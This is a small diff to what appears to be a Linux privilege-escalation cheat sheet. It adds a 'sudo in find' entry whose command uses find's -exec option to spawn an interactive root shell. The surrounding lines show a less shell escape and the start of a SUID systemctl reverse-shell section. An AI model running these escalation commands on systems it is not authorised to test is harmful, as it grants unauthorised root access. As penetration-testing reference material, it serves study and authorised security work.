@@ -125,6 +125,11 @@ sudo less /var/log/kern.log
 :!/bin/bash
 ```
 
+### sudo in find
+```bash
+sudo find /var/log -name kern.log  -exec /bin/bash -i \;
+```
+
 #### SUID /bin/systemctl
 create revshell.service as:
 ```bash
